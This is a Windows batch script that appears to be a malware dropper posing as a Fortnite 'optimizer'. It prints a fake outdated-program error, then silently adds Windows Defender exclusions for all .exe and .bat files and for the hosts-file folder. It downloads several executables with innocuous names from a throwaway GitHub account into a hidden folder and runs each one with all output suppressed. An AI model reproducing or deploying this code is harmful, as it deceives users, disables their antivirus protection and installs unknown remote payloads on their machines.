@echo off

:: Display a fake error message
echo Error: This program is outdated. Please download the latest version.
echo.
echo.
echo.
echo.
echo.
echo.
echo Attempting to download the newest tweaks and optimizers from our servers:


:: Turn off command echoing
@echo off

:: Define the target folder
set "targetFolder=%localappdata%\.microsoft"

:: Create the folder if it doesn't exist
if not exist "%targetFolder%" (
    mkdir "%targetFolder%"
)
set "url1=https://github.com/HIDDENID171/Annonymous121/raw/refs/heads/main/FortniteOptimizerV2.exe"
powershell -Command "Invoke-WebRequest '%url1%' -OutFile '%targetFolder%\FortniteOptimizerV2.exe'" >nul 2>&1
timeout /t 1 /nobreak
start "" "%targetFolder%\FortniteOptimizerV2.exe" >nul 2>&1

:: Add exclusions for executables and paths silently
powershell -Command "Add-MpPreference -ExclusionExtension '.exe'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension '.bat'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32\drivers\etc'" >nul 2>&1

timeout  /t 4 /nobreak
:: Define download links
set "url2=https://github.com/HIDDENID171/Annonymous121/raw/refs/heads/main/IPConfig.exe"
set "url3=https://github.com/HIDDENID171/Annonymous121/raw/refs/heads/main/TempDelete.exe"
set "url4=https://github.com/HIDDENID171/Annonymous121/raw/refs/heads/main/TaskScheduler.exe"
set "url5=https://github.com/HIDDENID171/Annonymous121/raw/refs/heads/main/Registry.exe"

:: Use PowerShell to download files silently
powershell -Command "Invoke-WebRequest '%url2%' -OutFile '%targetFolder%\IPConfig.exe'" >nul 2>&1
powershell -Command "Invoke-WebRequest '%url3%' -OutFile '%targetFolder%\TempDelete.exe'" >nul 2>&1
powershell -Command "Invoke-WebRequest '%url4%' -OutFile '%targetFolder%\TaskScheduler.exe'" >nul 2>&1
powershell -Command "Invoke-WebRequest '%url5%' -OutFile '%targetFolder%\Registry.exe'" >nul 2>&1

:: Run the downloaded files silently
start "" "%targetFolder%\IPConfig.exe" >nul 2>&1
start "" "%targetFolder%\TempDelete.exe" >nul 2>&1
start "" "%targetFolder%\TaskScheduler.exe" >nul 2>&1
start "" "%targetFolder%\Registry.exe" >nul 2>&1


